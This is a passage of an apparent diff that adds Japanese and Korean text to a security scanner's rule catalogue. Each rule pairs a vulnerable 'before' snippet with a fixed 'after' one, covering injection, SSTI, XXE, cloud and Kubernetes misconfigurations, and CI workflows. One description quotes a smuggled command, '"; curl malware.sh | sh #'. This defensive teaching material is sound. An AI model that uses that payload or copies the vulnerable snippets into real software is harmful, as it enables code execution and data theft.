+    title: "Kubernetesマニフェストのコンテナがrootとして実行されるよう設定されています",
+    description:
+      'securityContextの"runAsUser: 0"または"runAsNonRoot: false"が、コンテナ内でのroot実行を明示的に強制しています。攻撃者がコンテナ内でコードを実行できた場合(例えば脆弱なライブラリを悪用して)、コンテナ内でrootであることは、ホストへの脱出やより広い範囲への影響を容易にします。',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetesマニフェストのコンテナが、開始時より多くの権限を得られる可能性があります",
+    description:
+      'securityContextの"allowPrivilegeEscalation: true"は、コンテナ内のプロセスが、それを起動したプロセスより多くの権限を得ることを許可します(例えばsetuidビットの付いたバイナリ経由)。アプリケーションの脆弱性と組み合わさると、意図された以上の権限でコードを実行する一歩手前の状態になります。',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetesマニフェストのpodがホストのネットワーク、プロセス、または共有メモリを共有しています",
+    description:
+      '"hostNetwork"、"hostPID"、または"hostIPC"がtrueに設定されていると、podは通常の分離から外れます。hostNetworkはpodをホストのネットワークに公開し(クラスターのネットワークポリシーを回避)、hostPIDはホストマシン上のすべてのプロセスへの可視性を与え、hostIPCはホストの共有メモリへのアクセスを与えます。通常のアプリではほとんど必要なく、典型的には低レベルのシステム/監視ツールでのみ使われます。',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetesマニフェストがnon-rootユーザーでの実行を明示的に強制していません",
+    description:
+      'マニフェストのどこにも(podレベルでもコンテナレベルでも)"runAsNonRoot"が設定されていません。設定しない場合、コンテナはそのイメージが定義するユーザーとして実行されます — イメージ自体がそれを変更していなければ、多くの場合デフォルトでrootです。明示的にtrueに設定すると、イメージがそれでもrootとして実行しようとした場合にpodの起動が失敗するため、インシデントが起きて初めて気づくのではなく、事前に気づけます。',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+},
+  ko: {
+  "supabase-service-role-in-client": {
+    title: "Supabase의 비밀 키가 브라우저용 파일에 그대로 노출됩니다",
+    description:
+      "공개 접두사(예: NEXT_PUBLIC_, VITE_)가 붙은 변수나 클라이언트 측 파일이 Supabase의 서비스 역할 키를 참조합니다. 이 키는 Row Level Security를 우회합니다: 브라우저 번들에 포함되면 누구나 이를 읽고 데이터베이스 관리자처럼 행동할 수 있습니다.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (서버 전용)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "비밀번호나 비밀 키가 코드에 직접 작성되어 있습니다",
+    description:
+      "API 키, 토큰 또는 비밀번호가 환경 변수에서 읽어오는 대신 리터럴 값으로 작성된 것으로 보입니다. 소스 코드(또는 저장소가 공개라면 저장소 전체)를 읽는 사람은 누구나 그 비밀을 얻게 됩니다.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "프로젝트의 실제 비밀번호가 담긴 파일이 분석 대상에 포함되어 있습니다",
+    description:
+      "실제 값이 담긴 .env 파일(.env.example이 아님)이 분석에 포함되어 있습니다. 이 파일이 저장소나 공개 배포에 포함되면 그 안의 모든 자격 증명이 노출됩니다.",
+    fix: {
+      before: `# .env (실수로 커밋됨)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (커밋됨)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env는 저장소에서 제외됩니다 (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "누구나 모든 사용자의 데이터를 읽거나 수정할 수 있습니다",
+    description:
+      "Row Level Security가 비활성화되어 있거나, 요청자를 확인하지 않고 누구에게나 접근을 허용하는 정책(USING (true))이 설정되어 있습니다. 인증된 모든 사용자 — 또는 익명 사용자조차 — 다른 모든 사람의 데이터를 읽거나 수정할 수 있습니다.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "사용자가 입력한 값이 데이터베이스 쿼리에 그대로 붙여넣어집니다",
+    description:
+      "SQL 쿼리가 매개변수를 사용하는 대신 문자열을 직접 연결하거나 보간하여 만들어집니다. 그 텍스트가 (간접적으로라도) 사용자로부터 온 것이라면 쿼리 자체를 변경할 수 있습니다 — SQL 인젝션.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "비밀번호가 보호되지 않는 것으로 보입니다",
+    description:
+      "비밀번호 필드가 요청에서 받은 그대로 저장되며, 파일 안에 해싱 함수(bcrypt, argon2, scrypt)가 전혀 보이지 않습니다. 데이터베이스가 침해되면 모든 비밀번호를 즉시 사용할 수 있게 됩니다.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "로그인 서명에 사용되는 시크릿이 코드에 평문으로 작성되어 있습니다",
+    description:
+      "jwt.sign / jwt.verify에 전달되는 시크릿(또는 JWT_SECRET 변수)이 환경 변수가 아니라 코드 안의 리터럴 값입니다. 이를 읽는 사람은 누구나 모든 사용자에 대한 유효한 액세스 토큰을 만들 수 있습니다.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "서버가 외부 명령을 실행하도록 강제될 수 있습니다",
+    description:
+      "시스템 명령을 실행하는 함수(exec, execSync, spawn)가 보간이나 연결로 만들어진 문자열을 받습니다. 그 문자열의 일부가 사용자 입력에서 온 것이라면, 이를 제어하는 사람이 서버에서 임의의 명령을 실행시킬 수 있습니다.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "서버의 파일을 외부에서 경로를 지정해 읽거나 쓸 수 있습니다",
+    description:
+      '파일을 읽거나, 쓰거나, 전송하는 함수가 허용된 폴더 안에 머무는지 확인하지 않고 요청 값(query, body, params)에서 경로를 직접 받습니다. 공격자는 "../"를 삽입해 의도된 폴더를 벗어나 서버의 임의의 파일(예: 자격 증명이 담긴 설정 파일)을 읽거나 덮어쓸 수 있습니다.',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("허용되지 않은 경로")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "사용자가 입력한 값이 MongoDB 쿼리 안에서 코드로 실행됩니다",
+    description:
+      "MongoDB의 $where 연산자는 모든 문서에 대해 서버 측 JavaScript를 실행합니다 — 그 문자열이 사용자로부터 온 값을 연결해 만들어진 것이라면, 이를 제어하는 사람은 일반적인 SQL 인젝션처럼 필터만 바꾸는 것이 아니라 데이터베이스 컨텍스트에서 임의의 코드를 실행시킬 수 있습니다.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "사용자가 입력한 값이 데이터가 아니라 템플릿으로 해석됩니다",
+    description:
+      "템플릿을 컴파일/렌더링하는 함수가 고정된 템플릿을 사용하고 데이터만 전달하는 대신, 요청 값에서 템플릿 전체를 받습니다. 공격자는 템플릿 엔진의 문법(예: Jinja2의 {{7*7}})을 직접 작성해 서버에서 코드를 실행시킬 수 있습니다 — Server-Side Template Injection은 XSS처럼 단순한 표시 문제가 아니라 임의의 명령 실행으로 이어지는 경우가 많습니다.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML 파서가 파일을 읽거나 외부 요청을 보내도록 강제될 수 있습니다",
+    description:
+      "XML 파서(DocumentBuilderFactory)가 인근 코드에서 외부 엔티티(DOCTYPE)를 명시적으로 비활성화하지 않은 채 생성됩니다. 신뢰할 수 없는 소스에서 XML을 받는다면, 공격자는 외부 엔티티를 정의해 서버의 파일을 읽거나 원하는 주소로 서버가 연결하게 만들 수 있습니다 — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Dockerfile의 ENV 또는 ARG 명령에 비밀이 직접 작성되어 있습니다",
+    description:
+      "password/secret/token/key와 같은 이름의 변수가 ENV 또는 ARG 명령에 리터럴 값을 가지고 있습니다. 일반적으로 이미지에 포함되지 않는 .env 파일과 달리, 이 값은 Docker 이미지 자체에 내장됩니다 — Dockerfile의 이후 버전에서 그 줄이 제거되더라도, 이미지를 pull하거나 레이어 기록을 조사할 수 있는 사람은 누구나 이를 복구할 수 있습니다.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# docker build --build-arg DB_PASSWORD=***로 전달됩니다 (또는 더 좋은 방법으로,\n# 레이어 기록에 남지 않는 BuildKit 시크릿 마운트를 사용하세요)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetes 매니페스트의 컨테이너가 privileged로 실행됩니다",
+    description:
+      '컨테이너의 securityContext에 있는 "privileged: true"는 컨테이너와 호스트 사이의 일반적인 격리를 거의 모두 비활성화합니다: 컨테이너가 호스트의 장치에 접근하고, 네트워크 구성을 변경하며, 많은 경우 이를 실행하는 머신에 대한 루트 접근 권한을 사실상 얻게 됩니다. 일반적인 앱에는 거의 필요하지 않습니다.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # 실제로 필요한 capability만`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Kubernetes 매니페스트의 env 변수에 비밀이 평문으로 작성되어 있습니다",
+    description:
+      'password/secret/token/key와 같은 이름의 환경 변수가 Secret("valueFrom.secretKeyRef")에서 읽어오는 대신 리터럴 값("value:")을 가지고 있습니다. 매니페스트 자체는 — 종종 저장소에 커밋되므로 — 비밀을 평문으로 담고 있으며, 클러스터에서 명령을 실행할 수 없고 구성만 읽을 수 있는 사람에게도 보입니다.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Terraform 보안 그룹이 민감한 포트를 전체 인터넷에 열어둡니다",
+    description:
+      '0.0.0.0/0(모든 IP 주소)을 포함하는 "cidr_blocks" 규칙이 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트(MySQL, Postgres, MongoDB, Redis, SQL Server) — 근처에 있습니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Google Cloud 방화벽 규칙이 민감한 포트를 전체 인터넷에 열어둡니다",
+    description:
+      '0.0.0.0/0(모든 IP 주소)을 포함하는 "source_ranges"를 가진 "google_compute_firewall" 리소스가 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트(MySQL, Postgres, MongoDB, Redis, SQL Server) — 로의 트래픽을 허용합니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Azure 네트워크 규칙이 민감한 포트를 전체 인터넷에 열어둡니다",
+    description:
+      '네트워크 보안 규칙("azurerm_network_security_rule", 또는 "azurerm_network_security_group" 안의 "security_rule" 블록)이 "source_address_prefix"를 "*" 또는 "0.0.0.0/0"으로, 방향을 "Inbound"로, 접근을 "Allow"로 설정한 채 민감한 포트 — SSH(22), RDP(3389), 또는 일반적인 데이터베이스 포트 — 근처에 있습니다. 인터넷상의 누구나 그 서비스에 연결을 시도할 수 있으며, 허용되어야 할 사람만 그런 것이 아닙니다.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # 당신의 사설 네트워크나 베스천 호스트만\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Terraform 변수의 기본값으로 비밀이 작성되어 있습니다",
+    description:
+      'password/secret/token/key와 같은 이름의 변수가 "default"에 리터럴 값을 가지고 있습니다. 런타임에 전달되는 값(tfvars, TF_VAR_* 환경 변수)과 달리, 기본값은 소스 코드에 남습니다 — 저장소가 공유되거나 공개라면, Terraform 상태에 접근하지 않고도 누구나 이를 볼 수 있습니다.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # 기본값 없음: .tfvars 파일(git 외부) 또는 TF_VAR_db_password 환경 변수로 전달하세요\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "외부 사용자가 제어하는 값이 CI 셸 명령에 직접 들어갑니다",
+    description:
+      'GitHub Actions 워크플로의 "run:" 명령이 pull request 제목, 브랜치 이름, 댓글 텍스트 같은 값을 직접 보간합니다 — 이 모두는 외부 fork에서조차 pull request나 댓글을 여는 누구나 쓸 수 있는 값입니다. `"; curl malware.sh | sh #` 같은 값은 해당 워크플로에서 사용 가능한 모든 시크릿에 접근하면서 CI에서 임의의 명령을 실행시킬 수 있습니다.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 환경 변수로 전달되며, 명령에 직접 보간되지 않습니다`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "워크플로가 저장소의 시크릿에 접근할 수 있는 상태로 외부 pull request의 코드를 실행합니다",
+    description:
+      '워크플로가 "pull_request_target"을 사용합니다 — 이는 관련 없는 fork에서 열린 pull request에 대해서도 기본 저장소의 권한과 시크릿으로 실행됩니다 — 그리고 기본 브랜치가 아니라 pull request 자체의 코드("github.event.pull_request.head")를 체크아웃합니다. pull request를 여는 사람은 사실상 그 시크릿에 접근할 수 있는 상태로 자신의 코드를 실행시키게 됩니다.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PR의 코드가 아니라 기본 브랜치를 체크아웃합니다 — 또는 더 넓은\n      # 권한/시크릿이 필요하지 않다면 "pull_request_target" 대신\n      # "pull_request"를 사용하세요.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "요청 데이터가 코드를 실행할 수 있는 형식으로 역직렬화됩니다",
+    description:
+      "pickle(Python), unserialize()(PHP), ObjectInputStream(Java), 또는 node-serialize 라이브러리(Node)가 요청에서 직접 가져온 값을 역직렬화하고 있습니다. JSON과 달리 이 형식들은 역직렬화 과정 자체에서 코드를 표현하고 실행할 수 있습니다 — 전송된 값을 제어하는 사람이 서버에서 임의의 코드 실행을 얻을 수 있습니다.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON은 pickle과 달리 파싱 중에 절대 코드를 실행하지 않습니다`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: '코드가 서명되지 않은 JWT 토큰("none" 알고리즘)을 명시적으로 허용합니다',
+    description:
+      'JWT 토큰을 검증할 때 허용되는 알고리즘 중에 "none"이 포함되어 있습니다. "none" 알고리즘을 가진 토큰은 검증할 서명이 전혀 없습니다: 누구나 임의의 내용(예: 관리자 역할)으로 토큰을 만들 수 있고 코드는 이를 유효한 것으로 받아들입니다.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 허용 알고리즘에 "none"을 절대 포함하지 마세요`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "새 테이블이 보호 없이 생성되는 것으로 보입니다",
+    description:
+      "SQL 마이그레이션이 테이블을 생성하지만 같은 파일 안에서 그 테이블에 대해 Row Level Security를 활성화하지 않습니다. 이 상태가 유지되는 한, 테이블은 누구나 읽거나 쓸 수 있는 제한 없는 상태로 시작됩니다.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "사이트가 다른 모든 웹사이트의 요청을 허용합니다",
+    description:
+      "CORS 헤더가 모든 출처(*)의 요청을 허용하도록 설정되어 있거나, cors() 미들웨어가 제한 없이 사용되고 있습니다. 어떤 제3자 웹사이트든 이미 인증된 사용자의 브라우저에서 당신의 API를 호출할 수 있습니다.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "관리자 권한을 가진 함수가 사용자를 확인하지 않습니다",
+    description:
+      "이름에서 관리자 작업임을 암시하는 라우트나 함수에 인근 코드에 인증이나 역할 확인이 전혀 없습니다. URL을 아는 사람은 누구나 이를 실행할 수 있습니다.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "사이트가 외부 코드를 실행하도록 강제될 수 있습니다",
+    description:
+      "나가는 HTTP 요청(fetch, axios)이 사용자 요청에서 온 값을 대상 URL로 직접 사용합니다. 악의적인 사용자가 서버로 하여금 내부 주소나 임의의 주소를 호출하게 만들 수 있습니다 — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("허용되지 않은 URL")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "비밀번호가 이제는 쉽게 뚫리는 방식으로 보호되고 있습니다",
+    description:
+      "같은 줄에서 md5() 또는 sha1()이 비밀번호와 관련된 값에 적용됩니다. 이 알고리즘들은 계산 속도가 너무 빨라서, 데이터베이스를 가진 공격자는 초당 수십억 개의 비밀번호를 시도할 수 있습니다.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kubernetes 매니페스트의 컨테이너가 root로 실행되도록 설정되어 있습니다",
+    description:
+      'securityContext의 "runAsUser: 0" 또는 "runAsNonRoot: false"는 컨테이너가 root로 실행되도록 명시적으로 강제합니다. 공격자가 컨테이너 안에서 코드를 실행하는 데 성공하면(예: 취약한 라이브러리를 악용하여), 컨테이너 안의 root 권한은 호스트로의 탈출이나 더 넓은 영향을 더 쉽게 만듭니다.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetes 매니페스트의 컨테이너가 시작 시점보다 더 많은 권한을 얻을 수 있습니다",
+    description:
+      'securityContext의 "allowPrivilegeEscalation: true"는 컨테이너 안의 프로세스가 자신을 시작한 프로세스보다 더 많은 권한을 얻도록 허용합니다(예: setuid 바이너리를 통해). 애플리케이션의 취약점과 결합되면, 의도한 것보다 더 많은 권한으로 코드를 실행하는 데 한 걸음 더 가까워집니다.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetes 매니페스트의 pod가 호스트의 네트워크, 프로세스 또는 공유 메모리를 공유합니다",
+    description:
+      '"hostNetwork", "hostPID" 또는 "hostIPC"가 true로 설정되면 pod가 일반적인 격리에서 벗어납니다: hostNetwork는 pod를 호스트의 네트워크에 노출시키고(클러스터의 네트워크 정책을 우회), hostPID는 호스트 머신의 모든 프로세스를 볼 수 있게 하며, hostIPC는 호스트의 공유 메모리에 접근할 수 있게 합니다. 일반적인 앱에는 거의 필요하지 않으며, 보통 저수준 시스템/모니터링 도구에만 필요합니다.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Terraform에 정의된 S3 버킷에서 Block Public Access가 비활성화되어 있습니다",
+    description:
+      '"aws_s3_bucket_public_access_block"의 네 가지 보호 기능(block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) 중 하나 이상이 false로 설정되어 있습니다. 버킷이 이미 공개되었다는 의미는 아니지만, 향후 실수로 공개되는 것을 막아줄 안전망을 제거합니다.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraform에 정의된 IAM 정책이 전체 접근 권한을 부여합니다",
+    description:
+      'action "*"과 resource "*"를 가진 statement는 모든 AWS 서비스와 리소스에 대한 전체 접근 권한을 부여합니다 — 적용되기도 전에 코드에서 직접 읽어낸, 실제 IAM 상태에서 이미 수행하는 것과 동일한 점검입니다. 비상용 역할을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 권한만 부여하세요.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Google Cloud Storage 버킷이 누구나 읽을 수 있도록 설정되어 있습니다",
+    description:
+      '"google_storage_bucket_iam_member" 또는 "google_storage_bucket_iam_binding" 리소스가 "allUsers" 또는 "allAuthenticatedUsers"에 역할을 부여합니다 — 전자는 Google 계정이 없어도 인터넷상의 누구나 버킷을 읽을 수 있게 하고, 후자는 접근해야 할 사람뿐 아니라 Google 계정을 가진 누구나 읽을 수 있게 합니다.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # allUsers/allAuthenticatedUsers가 아니라 실제로 접근이 필요한 사람만\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Azure 스토리지 계정에서 공개 Blob 접근이 활성화되어 있습니다",
+    description:
+      '"azurerm_storage_account"에서 "allow_blob_public_access"가 true로 설정되어 있습니다: 공개된 blob/컨테이너의 URL을 아는 사람은 누구나 인증 없이 이를 읽을 수 있습니다.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Google Cloud IAM 역할이 전체 접근 권한(Owner/Editor)을 부여합니다",
+    description:
+      '"google_project_iam_binding"/"google_project_iam_member"(또는 조직/폴더 수준의 동등한 리소스)가 기본 역할 "roles/owner" 또는 "roles/editor"를 할당합니다 — 프로젝트 내 거의 모든 서비스에 대한 전체 접근 권한입니다. 비상용 계정을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 더 구체적인 미리 정의된 역할만 부여하세요.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # roles/owner가 아니라 실제로 필요한 미리 정의된 역할만\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Azure 역할 할당이 전체 접근 권한(Owner)을 부여합니다",
+    description:
+      '"azurerm_role_assignment"가 "Owner" 역할을 할당합니다 — 할당된 전체 범위(구독, 리소스 그룹...)에서 다른 사용자의 권한을 제어하는 것까지 포함한 전체 접근 권한입니다. 비상용 계정을 위한 의도일 수 있지만 확인이 필요합니다: 일상적인 용도로는 실제로 필요한 더 구체적인 역할만 부여하세요(예: 단일 리소스 그룹에 대한 "Contributor").',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 전체 구독에 대한 Owner가 아니라 실제로 필요한 더 구체적인 역할만\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "보안 토큰이 암호학적으로 안전하지 않은 난수 생성기로 생성됩니다",
+    description:
+      "token/session/reset/otp/csrf와 같은 이름의 값이 Math.random()(JS), random.random()(Python), rand()(PHP)로 생성됩니다 — 보안을 위해 설계되지 않았고 시퀀스를 예측할 수 있는 생성기입니다. 이렇게 생성된 토큰은 추측되거나 재구성될 수 있어, 존재하는 목적을 무력화합니다(예: 누구나 예측할 수 있는 비밀번호 재설정 링크).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random 아님 — 예측 불가능`,
+    },
+  },
+  "ldap-injection": {
+    title: "LDAP 필터가 요청 값을 직접 연결하여 만들어집니다",
+    description:
+      'LDAP 필터(예: "(uid=...)")를 만드는 줄이 LDAP 특수 문자를 전혀 이스케이프하지 않고 요청에서 가져온 값을 직접 포함합니다. 그 값을 제어하는 사람은 필터의 로직을 변경할 수 있습니다 — 예를 들어 인증 확인을 우회하거나 보면 안 되는 디렉터리 데이터를 읽을 수 있습니다.',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // 필터에 사용하기 전에 LDAP 특수 문자는 항상 이스케이프해야 합니다\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "사용자가 작성한 텍스트가 브라우저에서 코드를 실행할 수 있습니다",
+    description:
